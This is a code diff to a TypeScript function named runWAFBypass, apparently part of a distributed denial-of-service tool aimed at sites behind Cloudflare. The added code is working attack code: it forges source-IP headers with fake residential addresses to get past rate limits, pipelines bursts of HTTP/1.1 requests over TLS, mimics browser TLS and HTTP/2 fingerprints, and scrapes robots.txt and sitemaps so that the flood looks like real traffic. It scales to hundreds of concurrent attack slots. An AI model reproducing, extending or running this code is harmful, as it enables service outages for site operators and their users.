@@ -2436,7 +2665,8 @@ async function runWAFBypass(
   const VARY_LANGS     = ["en-US,en;q=0.9","pt-BR,pt;q=0.9","es-ES,es;q=0.9","fr-FR,fr;q=0.9","de-DE,de;q=0.9","zh-CN,zh;q=0.9","ja-JP,ja;q=0.9","ko-KR,ko;q=0.9","it-IT,it;q=0.9","ru-RU,ru;q=0.9","ar-SA,ar;q=0.9","hi-IN,hi;q=0.9"];
   const VARY_ENCODINGS = ["gzip, deflate, br","gzip, deflate","br","gzip","deflate, br, zstd","gzip, br, zstd","identity"];
   const runCacheAnnihilatorSlot = async (s: AbortSignal = signal): Promise<void> => {
-    const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+    const bt        = randomBrowserType();
+    const p         = pickProfile(bt);
     const cookieJar = new Map<string, string>();
     while (!s.aborted) {
       const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
@@ -2446,7 +2676,7 @@ async function runWAFBypass(
         const ac     = new AbortController();
         const timer  = setTimeout(() => ac.abort(), 8_000);
         if (s.aborted) { clearTimeout(timer); break; }
-        const wafHdrs = buildWAFHeaders(hostname, fullPath, cookieJar, p);
+        const wafHdrs = buildWAFHeaders(hostname, fullPath, cookieJar, p, bt);
         const fetchHdrs: Record<string, string> = {};
         for (const [k, v] of Object.entries(wafHdrs)) {
           if (!k.startsWith(":")) fetchHdrs[k] = v;
@@ -2485,7 +2715,8 @@ async function runWAFBypass(
     ["/", "/pricing", "/signup", "/api/v1/register", "/api/v1/verify"],
   ];
   const runSessionAmplifierSlot = async (s: AbortSignal = signal): Promise<void> => {
-    const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
+    const bt        = randomBrowserType();
+    const profile   = pickProfile(bt);
     const cookieJar = new Map<string, string>();
     while (!s.aborted) {
       const journey = SESSION_JOURNEYS[randInt(0, SESSION_JOURNEYS.length)];
@@ -2497,7 +2728,7 @@ async function runWAFBypass(
           const timer = setTimeout(() => ac.abort(), 10_000);
           if (s.aborted) { clearTimeout(timer); break; }
           const bust     = `?_s=${randStr(8)}&uid=${randStr(12)}`;
-          const wafHdrs  = buildWAFHeaders(hostname, step + bust, cookieJar, p);
+          const wafHdrs  = buildWAFHeaders(hostname, step + bust, cookieJar, profile, bt);
           const fetchHdrs: Record<string, string> = {};
           for (const [k, v] of Object.entries(wafHdrs)) if (!k.startsWith(":")) fetchHdrs[k] = v;
           const res = await fetch(`https://${hostname}${isPost ? step : step + bust}`, {
@@ -2552,7 +2783,7 @@ async function runWAFBypass(
             }, randInt(15_000, 40_000));
           } catch { opened = Math.max(0, opened - 1); }
         };
-        conn.on("connect", () => { for (let i = 0; i < MAX_DRAIN; i++) setTimeout(openDrain, i * 25); });
+        conn.on("connect", () => { injectH2WindowUpdate(conn, CHROME_H2_WU_INCREMENT); for (let i = 0; i < MAX_DRAIN; i++) setTimeout(openDrain, i * 25); });
         conn.on("error",   () => resolve());
         conn.on("close",   () => resolve());
         setTimeout(() => cleanup(), randInt(50_000, 90_000));
@@ -2604,9 +2835,187 @@ async function runWAFBypass(
   };
   void burstLoop();
 
-  // ── Launch all 6 active vectors simultaneously ───────────────────────────
-  // Vector V (origin direct) added once discovery completes — use primary slots
-  // pointed at origin IP (bypasses CF edge entirely if origin IP found)
+  // ── VECTOR VIII: IP Spoof Header Rotation ────────────────────────────────
+  // Many WAFs trust X-Forwarded-For / CF-Connecting-IP to determine source IP.
+  // Injecting residential-looking IPs causes WAF to throttle wrong IP ranges
+  // and can bypass per-IP rate limits on misconfigured origins.
+  const RESIDENTIAL_IP_OCTETS = [
+    // APNIC residential (AU/NZ/SG/MY)
+    [203,125], [175,45], [118,127], [110,33], [202,140],
+    // RIPE residential (EU)
+    [89,204], [92,60], [213,165], [77,111], [188,75],
+    // ARIN residential (US/CA)
+    [76,214], [98,140], [108,214], [73,139], [50,204],
+    // LACNIC residential (BR/MX)
+    [189,125], [200,100], [177,99], [186,232], [181,55],
+  ];
+  function randResidentialIP(): string {
+    const pair = RESIDENTIAL_IP_OCTETS[randInt(0, RESIDENTIAL_IP_OCTETS.length)];
+    return `${pair[0]}.${pair[1]}.${randInt(1,254)}.${randInt(1,254)}`;
+  }
+  // XFF chain: 1-3 hops of residential IPs, last hop = Cloudflare edge IP
+  function buildXFFChain(): string {
+    const hops = randInt(1, 3);
+    const chain = Array.from({ length: hops }, () => randResidentialIP());
+    chain.push(`172.${randInt(64,71)}.${randInt(0,255)}.${randInt(1,254)}`); // CF edge IP
+    return chain.join(", ");
+  }
+  const NUM_SPOOF = IS_DEPLOYED ? Math.min(Math.floor(primaryT * 0.3), 200) : Math.min(Math.floor(primaryT * 0.3), 8);
+  const runIPSpoofSlot = async (s: AbortSignal = signal): Promise<void> => {
+    const bt        = randomBrowserType();
+    const profile   = pickProfile(bt);
+    const cookieJar = new Map<string, string>();
+    while (!s.aborted) {
+      const tls = browserTLSProfile(bt);
+      await new Promise<void>(resolve => {
+        let c: ReturnType<typeof h2connect> | null = null;
+        try {
+          c = h2connect(target, {
+            rejectUnauthorized: false, servername: hostname,
+            ciphers: tls.ciphers, ecdhCurve: tls.ecdhCurve,
+            minVersion: tls.minVersion as "TLSv1.2" | "TLSv1.3",
+            settings: browserH2Settings(bt), ALPNProtocols: ["h2", "http/1.1"],
+          });
+        } catch { resolve(); return; }
+        const conn    = c;
+        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
+        const lifeT   = setTimeout(() => cleanup(), 12_000);
+        let inflight  = 0;
+        const SLOTS   = IS_DEPLOYED ? 128 : 16;
+        const pump    = () => {
+          if (s.aborted || conn.destroyed) { resolve(); return; }
+          while (inflight < SLOTS && !s.aborted && !conn.destroyed) {
+            inflight++;
+            const path   = WAF_PATHS[randInt(0, WAF_PATHS.length)] + `?v=${randStr(6)}`;
+            const srcIP  = randResidentialIP();
+            const hdrs   = buildWAFHeaders(hostname, path, cookieJar, profile, bt);
+            // Inject IP spoof headers — may bypass origin-level rate limiting
+            hdrs["x-forwarded-for"]    = buildXFFChain();
+            hdrs["x-real-ip"]          = srcIP;
+            hdrs["cf-connecting-ip"]   = srcIP;
+            hdrs["true-client-ip"]     = srcIP;
+            hdrs["x-originating-ip"]   = srcIP;
+            hdrs["forwarded"]          = `for=${srcIP};proto=https`;
+            try {
+              const stream = conn.request(hdrs);
+              stream.on("response", () => { localPkts++; localBytes += 1024; });
+              stream.on("data",     () => {});
+              stream.on("error",    () => { inflight = Math.max(0, inflight - 1); if (!s.aborted) setImmediate(pump); });
+              stream.on("close",    () => { inflight = Math.max(0, inflight - 1); if (!s.aborted) setImmediate(pump); });
+              stream.end();
+            } catch { inflight--; break; }
+          }
+        };
+        conn.on("connect", () => { injectH2WindowUpdate(conn, browserWUIncrement(bt)); pump(); });
+        conn.on("error", () => resolve());
+        conn.on("close", () => resolve());
+        clearTimeout(lifeT);
+        setTimeout(() => cleanup(), 12_000);
+        s.addEventListener("abort", cleanup, { once: true });
+      });
+      if (!s.aborted) await new Promise(r => setTimeout(r, randInt(5, 30)));
+    }
+  };
+
+  // ── VECTOR IX: H1.1 TLS Pipeline Bypass ──────────────────────────────────
+  // Raw HTTP/1.1 pipelining over TLS with Upgrade: h2c header probing.
+  // Some WAFs have separate rule trees for H1.1 vs H2 traffic — H1.1 paths
+  // may have weaker rules, and pipelining sends N requests before reading any response.
+  // Also useful for origin discovery (some origins still speak H1.1 only).
+  const NUM_H1PIPE = IS_DEPLOYED ? Math.min(Math.floor(primaryT * 0.2), 150) : Math.min(Math.floor(primaryT * 0.2), 5);
+  const runH1PipelineSlot = async (s: AbortSignal = signal): Promise<void> => {
+    const tls = await import("node:tls");
+    const PIPE_DEPTH = IS_DEPLOYED ? 32 : 8; // requests per pipeline
+    while (!s.aborted) {
+      await new Promise<void>(resolve => {
+        let sock: import("node:tls").TLSSocket | null = null;
+        try {
+          sock = tls.connect({
+            host: resolvedIp, port: 443, servername: hostname,
+            rejectUnauthorized: false,
+            ciphers: randomTLSProfile().ciphers,
+          });
+        } catch { resolve(); return; }
+        const s0 = sock;
+        const cleanup = () => { try { s0.destroy(); } catch { /**/ } resolve(); };
+        const lifeT = setTimeout(cleanup, 10_000);
+        s0.once("error", cleanup);
+        s0.once("close", cleanup);
+        s0.once("secureConnect", () => {
+          // Build pipelined request batch
+          const bt     = randomBrowserType();
+          const prof   = pickProfile(bt);
+          const cookJar = new Map<string, string>();
+          const hdrs   = buildWAFHeaders(hostname, "/", cookJar, prof, bt);
+          const ua     = (hdrs["user-agent"] ?? "Mozilla/5.0") as string;
+          const cookie = (hdrs["cookie"] ?? "") as string;
+          let buf = "";
+          for (let i = 0; i < PIPE_DEPTH; i++) {
+            const path = WAF_PATHS[randInt(0, WAF_PATHS.length)] + `?_=${randStr(8)}&v=${randInt(1,999999)}`;
+            buf += `GET ${path} HTTP/1.1\r\n`;
+            buf += `Host: ${hostname}\r\n`;
+            buf += `User-Agent: ${ua}\r\n`;
+            buf += `Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n`;
+            buf += `Accept-Encoding: gzip, deflate, br\r\n`;
+            buf += `Connection: keep-alive\r\n`;
+            if (i === 0) buf += `Upgrade: h2c\r\n`; // probe for h2c cleartext upgrade
+            if (cookie) buf += `Cookie: ${cookie}\r\n`;
+            buf += `Cache-Control: no-cache\r\n`;
+            buf += `\r\n`;
+          }
+          s0.write(buf, "utf8", () => {
+            let raw = "";
+            s0.on("data", (chunk: Buffer) => {
+              raw += chunk.toString("utf8");
+              const responses = raw.split(/\r\n\r\n[\r\n]*/);
+              const complete  = responses.filter(r => /^HTTP\//.test(r)).length;
+              localPkts  += complete;
+              localBytes += raw.length;
+              if (complete >= PIPE_DEPTH) { clearTimeout(lifeT); cleanup(); }
+            });
+          });
+        });
+        s.addEventListener("abort", cleanup, { once: true });
+      });
+      if (!s.aborted) await new Promise(r => setTimeout(r, randInt(20, 100)));
+    }
+  };
+
+  // ── VECTOR X: Dynamic Path Harvest ───────────────────────────────────────
+  // Fetches robots.txt and sitemap.xml to discover real page paths.
+  // WAF bot-score heuristics check if requested paths actually exist on the site.
+  // Attacking real paths (from sitemap) produces legitimate-looking traffic patterns
+  // that score lower on behavioral ML models than randomized path flooding.
+  void (async () => {
+    try {
+      const ac = new AbortController();
+      setTimeout(() => ac.abort(), 8_000);
+      const robotsRes = await fetch(`https://${hostname}/robots.txt`, {
+        signal: ac.signal,
+        headers: { "user-agent": CHROME_PROFILES[0].ua, "accept": "text/plain,*/*" },
+      });
+      if (robotsRes.ok) {
+        const text = await robotsRes.text();
+        const paths = [...text.matchAll(/^(?:Allow|Disallow):\s*(\/.+)/gm)].map(m => m[1].split(/[?#]/)[0]).filter(p => p.length > 1 && p.length < 80);
+        if (paths.length > 0) WAF_PATHS.push(...paths.slice(0, 30));
+      }
+    } catch { /* robots.txt not available */ }
+    try {
+      const ac2 = new AbortController();
+      setTimeout(() => ac2.abort(), 8_000);
+      const smRes = await fetch(`https://${hostname}/sitemap.xml`, {
+        signal: ac2.signal,
+        headers: { "user-agent": CHROME_PROFILES[0].ua, "accept": "application/xml,text/xml,*/*" },
+      });
+      if (smRes.ok) {
+        const xml = await smRes.text();
+        const urls = [...xml.matchAll(/<loc>https?:\/\/[^/]+(\/.+?)<\/loc>/g)].map(m => m[1].split(/[?#]/)[0]).filter(p => p.length > 1 && p.length < 80);
+        if (urls.length > 0) WAF_PATHS.push(...urls.slice(0, 40));
+      }
+    } catch { /* sitemap not available */ }
+  })();
+
+  // ── Launch all 9 active vectors simultaneously ───────────────────────────
   const originSlots = (): Promise<void>[] => {
     if (originTarget === target) return [];
     return Array.from({ length: Math.floor(NUM_PRIMARY * 0.4) }, () => runPrimarySlot(originTarget));
@@ -2618,6 +3027,8 @@ async function runWAFBypass(
     ...Array.from({ length: NUM_CACHE    }, () => runCacheAnnihilatorSlot()),
     ...Array.from({ length: NUM_SESSION  }, () => runSessionAmplifierSlot()),
     ...Array.from({ length: NUM_DRAIN    }, () => runDrainSlot()),
+    ...Array.from({ length: NUM_SPOOF    }, () => runIPSpoofSlot()),
+    ...Array.from({ length: NUM_H1PIPE   }, () => runH1PipelineSlot()),
     ...originSlots(),
   ]);
 
